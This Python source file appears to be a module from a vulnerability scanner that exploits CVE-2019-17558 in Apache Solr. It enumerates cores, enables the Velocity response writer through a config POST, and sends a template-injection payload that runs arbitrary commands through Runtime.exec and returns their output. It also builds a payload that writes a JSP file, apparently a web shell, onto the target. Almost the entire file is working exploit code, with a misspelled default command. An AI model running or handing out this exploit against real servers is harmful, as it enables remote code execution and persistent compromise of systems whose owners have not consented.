#!/usr/bin/env python3

import json
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2019_17558_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-17558',
            'description': 'Apache Solr Code Injection Vulnerability, 受影响版本: Apache Solr 5.0.0-8.3.1',
            'date': '2020-04-18',
            'exptype': 'check',
            'type': 'Injection'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.osname = 'Unknown'
        self.headers = {
            'User-Agent': get_useragent(),
        }
        self.capta = get_capta()
        self.payload = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
        with open('app/static/upload_jsp.jsp', 'r', encoding = 'utf-8') as reader:
            jsp_data = reader.read()
        self.jsp_payload = self.payload.format(cmd = 'echo %s > %s.jsp' %(jsp_data, 'test'))

    async def check(self, send_payload = None):
       
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            if not send_payload:
                send_payload = self.payload.format(cmd = 'whomai')
            core_url = self.url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
            req = await request.get(core_url, headers = self.headers)
            if req.status == 200 and 'responseHeader' in await req.text() and 'status' in await req.text():
                json_str = json.loads(await req.text())
                for i in json_str['status']:
                    core_name_url = self.url + '/solr/' + i + '/config'
                    result = await self.update_queryresponsewriter(core_name_url, send_payload)
                    if result:
                        return result

        except Exception as e:
            # print(e)
            pass

    async def update_queryresponsewriter(self, core_name_url, send_payload):

        '''
        通过如下请求开启'params.resource.loader.enabled',其中API路径包含刚才获取的core名称
        '''

        headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/json'
        }
        payload = '''
        {
        "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
        }
        }'''
        req = await request.post(core_name_url, headers = headers, data = payload)
        if req.status == 200 and 'responseHeader' in await req.text():
            exp_url = core_name_url[:-7]
            check_payload = self.payload.format(cmd = 'echo ' + self.capta + 'win^dowslin$1ux')
            check_req = await request.get(exp_url + check_payload, headers = self.headers)
            if check_req.status == 200 and self.capta in await check_req.text():
                cmd_req = await request.get(exp_url + send_payload, headers = self.headers)
                if cmd_req.status == 500 and send_payload == self.jsp_payload:
                    return '存在漏洞'
                result = await cmd_req.text()
                return result.strip()

if __name__ == '__main__':
    CVE_2019_17558 = CVE_2019_17558_BaseVerify('http://127.0.0.1:8983')
    print(CVE_2019_17558.check())


